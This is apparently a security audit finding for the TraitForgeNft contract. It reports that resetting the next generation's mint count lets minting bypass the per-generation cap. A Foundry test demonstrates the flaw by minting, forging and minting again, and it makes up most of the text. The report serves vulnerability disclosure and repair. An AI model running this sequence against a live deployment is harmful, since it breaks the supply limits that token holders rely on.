# Vulnerability details

## Impact

`TraitForgeNft` provides two ways to mint tokens:
1. `_mintInternal` stores the mint amount of `currentGeneration`
2. `_mintNewEntity` stores the mint amount of father's generation + 1

That is, `generationMintCounts[gen]` will retain the current and next generation's mint amount.
But when the `currentGeneration` mint amount reaches `maxTokensPerGen`, `_incrementGeneration` will reset the mint amount of the next generation, causing minting amount of the next generation to bypass `maxTokensPerGen`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import 'forge-std/Test.sol';
import 'contracts/TraitForgeNft/TraitForgeNft.sol';
import 'contracts/EntityForging/EntityForging.sol';
import 'contracts/EntropyGenerator/EntropyGenerator.sol';
import 'contracts/NukeFund/NukeFund.sol';
import 'contracts/Airdrop/Airdrop.sol';

contract TestNFT is Test {
    EntityForging forge;
    EntropyGenerator gen;
    TraitForgeNft nft;
    NukeFund nuke;

    function setUp() public {
        nft = new TraitForgeNft();
        forge = new EntityForging(address(nft));
        gen = new EntropyGenerator(address(nft));
        gen.transferOwnership(address(nft));
        gen.writeEntropyBatch1();
        Airdrop airdrop = new Airdrop();
        airdrop.transferOwnership(address(nft));
        nuke = new NukeFund(address(nft), address(airdrop), payable(address(1)), payable(address(2)));
        nft.setRootHash(keccak256(abi.encodePacked(address(this))));
        nft.setEntityForgingContract(address(forge));
        nft.setEntropyGenerator(address(gen));
        nft.setAirdropContract(address(airdrop));
        nft.setNukeFundContract(payable(address(nuke)));
    }

    function testMintNftExceedMaxTokensPerGen() external {
        bytes32[] memory proof = new bytes32[](0);
        nft.mintToken{ value: nft.calculateMintPrice() }(proof);
        nft.mintToken{ value: nft.calculateMintPrice() }(proof);
        // @audit set entropy to forge
        nft.setTokenEntropy(1, 100020);
        nft.setTokenEntropy(2, 100010);

        forge.listForForging(1, forge.minimumListFee());

        address operator = makeAddr("Operator");
        nft.transferFrom(address(this), operator, 2);
        vm.deal(operator, 1 ether);
        vm.startPrank(operator);
        uint256 newTokenId = forge.forgeWithListed{ value: forge.minimumListFee() }(1, 2);
        assertEq(newTokenId, 3);
        vm.stopPrank();
        
        // @audit incrementGeneration will override generationMintCounts
        nft.mintToken{ value: nft.calculateMintPrice() }(proof);
        nft.mintToken{ value: nft.calculateMintPrice() }(proof);
        nft.mintToken{ value: nft.calculateMintPrice() }(proof);
        nft.mintToken{ value: nft.calculateMintPrice() }(proof);
        nft.mintToken{ value: nft.calculateMintPrice() }(proof);


        assertEq(nft.tokenGenerations(1), 1);
        assertEq(nft.tokenGenerations(2), 1);
        assertEq(nft.tokenGenerations(3), 2);
        assertEq(nft.tokenGenerations(4), 1);
        assertEq(nft.tokenGenerations(5), 2);
        assertEq(nft.tokenGenerations(6), 2);
        assertEq(nft.tokenGenerations(7), 2);
        assertEq(nft.tokenGenerations(8), 3);
    }

    receive() external payable {}
}
```
